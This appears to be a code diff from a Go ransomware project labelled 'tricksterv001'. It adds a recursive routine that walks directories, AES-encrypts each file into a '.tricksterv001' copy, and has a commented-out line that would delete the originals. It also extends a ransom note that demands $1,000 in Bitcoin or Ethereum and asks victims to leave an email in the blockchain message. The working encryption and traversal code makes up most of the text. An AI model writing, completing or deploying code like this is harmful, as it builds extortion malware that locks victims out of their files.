@@ -6,10 +6,11 @@ import (
 	"crypto/rand"
 	"fmt"
 	"io"
+
+	"io/fs"
 	"io/ioutil"
 	"log"
 	"os"
-	"strconv"
 )
 
 func AESEncrypt(text []byte) []byte {
@@ -90,6 +91,62 @@ func TestEncryptDecrypt() {
 	fmt.Println("[Decrypted]", string(decrypted))
 }
 
+func RecursiveEncrypt(index []int, dir string, file fs.FileInfo) {
+	for i := 0; i < len(index); i++ {
+		fmt.Print("_")
+	}
+	fmt.Println(index)
+
+	if file.IsDir() {
+		for i := 0; i < len(index); i++ {
+			fmt.Print("_")
+		}
+		fmt.Println("[DIR]", dir+"/"+file.Name())
+
+		files, _ := ioutil.ReadDir(dir + "/" + file.Name())
+
+		dirName := file.Name()
+
+		for i, file := range files {
+			newIndex := index
+			newIndex = append(newIndex, i+1)
+
+			RecursiveEncrypt(newIndex, dir+"/"+dirName, file)
+		}
+
+		return
+	}
+
+	for i := 0; i < len(index); i++ {
+		fmt.Print("_")
+	}
+	fmt.Println("[FILE]", dir+"/"+file.Name())
+
+	// Read file bytes
+	fBytes, err := ioutil.ReadFile(dir + "/" + file.Name())
+
+	if err != nil {
+		for i := 0; i < len(index); i++ {
+			fmt.Print("_")
+		}
+		fmt.Println("Error reading "+dir+"/"+file.Name(), ": ", err)
+	}
+
+	encryptedFileName := dir + "/" + file.Name() + ".tricksterv001"
+
+	for i := 0; i < len(index); i++ {
+		fmt.Print("_")
+	}
+	fmt.Println("Encrypted: " + encryptedFileName)
+
+	ioutil.WriteFile(encryptedFileName, AESEncrypt(fBytes), 0644)
+
+	// Delete original file
+	// os.Remove(dir + "/" + file.Name())
+
+	fmt.Println()
+}
+
 func main() {
 	TestEncryptDecrypt()
 
@@ -102,6 +159,8 @@ To retrieve your files back, please pay with the amount of $1.000 to this crypto
 BTC: IUR90EKJEKL2R90329993939420399324JRHHKSAF934
 ETH: OOEPWR=2389FJIEWIOOOEO3920ROIE2PRE2==ER2IKF989
 
+attach your email to the blockchain message, and we will contact you soon.
+
 And then we will send the procedures to retrieve your files back.`
 
 	fmt.Println(test)
@@ -110,30 +169,16 @@ And then we will send the procedures to retrieve your files back.`
 
 	fmt.Println("[FILES TO ENCRYPT]")
 
-	files, err := ioutil.ReadDir("./toencrypt")
+	dir := "./toencrypt"
+
+	files, err := ioutil.ReadDir(dir)
 
 	if err != nil {
 		log.Fatal(err)
 	}
 
 	for i, file := range files {
-		fmt.Println("[" + strconv.Itoa(i+1) + "]")
-		fmt.Println(file.Name())
-
-		// Read file bytes
-		fBytes, err := ioutil.ReadFile("./toencrypt/" + file.Name())
-
-		if err != nil {
-			fmt.Println("Error reading" + file.Name())
-		}
-
-		encryptedFileName := "./encrypted/" + file.Name() + ".tricksterv001"
-
-		fmt.Println("Encrypted: " + encryptedFileName)
-
-		ioutil.WriteFile(encryptedFileName, AESEncrypt(fBytes), 0644)
-
-		fmt.Println()
+		RecursiveEncrypt([]int{i + 1}, dir, file)
 	}
 
 	homeDir, _ := os.UserHomeDir()
